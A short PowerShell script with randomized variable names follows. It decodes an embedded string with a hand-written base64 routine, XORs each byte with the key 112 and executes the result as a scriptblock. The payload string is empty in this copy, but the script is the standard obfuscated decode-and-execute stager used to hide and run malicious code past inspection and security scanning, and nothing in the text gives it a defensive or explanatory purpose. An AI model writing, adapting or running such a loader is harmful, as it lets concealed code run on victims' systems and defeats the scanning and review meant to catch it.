$fav=112
$lop=""
$ukm='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
$pji=[int](($lop.Length/4)*3)
if($lop.EndsWith('==')){$pji=$pji-2}elseif($lop.EndsWith('=')){$pji=$pji-1}
$ttb=New-Object byte[] $pji
$ijx=0
for($fxo=0;$fxo-lt $lop.Length;$fxo+=4){
$qta=$ukm.IndexOf($lop[$fxo])
$psi=$ukm.IndexOf($lop[$fxo+1])
$mwl=0
if($lop[$fxo+2] -ne '='){$mwl=$ukm.IndexOf($lop[$fxo+2])}
$fff=0
if($lop[$fxo+3] -ne '='){$fff=$ukm.IndexOf($lop[$fxo+3])}
$iam=($qta -shl 18)-bor($psi -shl 12)-bor($mwl -shl 6)-bor $fff
if($ijx -lt $pji){$ttb[$ijx]=($iam -shr 16)-band 255;$ijx++}
if($ijx -lt $pji){$ttb[$ijx]=($iam -shr 8)-band 255;$ijx++}
if($ijx -lt $pji){$ttb[$ijx]=$iam -band 255;$ijx++}
}
$xnp=New-Object byte[] $pji
for($apm=0;$apm-lt $pji;$apm++){$xnp[$apm]=$ttb[$apm]-bxor $fav}
$zip=''
for($apm=0;$apm-lt $pji;$apm++){$zip += [char]$xnp[$apm]}
$lse=[scriptblock]::Create($zip)
& $lse
